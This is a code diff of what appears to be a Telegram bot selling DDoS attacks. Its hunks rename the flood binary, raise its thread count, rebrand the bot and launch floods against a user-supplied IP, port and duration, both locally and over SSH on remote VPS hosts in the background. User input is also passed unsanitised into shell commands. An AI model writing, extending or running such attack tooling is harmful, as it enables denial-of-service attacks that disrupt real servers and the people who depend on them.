@@ -288,7 +288,7 @@ def start_attack_reply(message, target, port, duration):
 
     # Start the actual attack using subprocess
 
-    subprocess.run(f"./RAJ {target} {port} {duration} 500", shell=True)
+    subprocess.run(f"./bgmi {target} {port} {duration} 1800", shell=True)
 
     
 
@@ -310,7 +310,7 @@ def send_welcome(message):
 
     
 
-    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **GODxCHEATS DDOS**! 💥
+    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **GAURAV DDOS**! 💥
 
     
 
@@ -1088,7 +1088,7 @@ def check_vps_status(vps_name):
 
         # Check if attack binary exists and is executable
 
-        stdin, stdout, stderr = ssh.exec_command("ls -la Alone/RAJ")
+        stdin, stdout, stderr = ssh.exec_command("ls -la Alone/bgmi")
 
         output = stdout.read().decode().strip()
 
@@ -1108,7 +1108,7 @@ def check_vps_status(vps_name):
 
         # Check if attack is already running
 
-        stdin, stdout, stderr = ssh.exec_command("ps aux | grep RAJ | grep -v grep")
+        stdin, stdout, stderr = ssh.exec_command("ps aux | grep bgmi | grep -v grep")
 
         running_processes = stdout.read().decode().strip()
 
@@ -1316,7 +1316,7 @@ def handle_vps_selection(message):
 
 
 
-        command = f"cd Alone && nohup ./RAJ {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']} 500 > /dev/null 2>&1 &"
+        command = f"cd Alone && nohup ./bgmi {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']} 1800 > /dev/null 2>&1 &"
 
         ssh.exec_command(command)
 
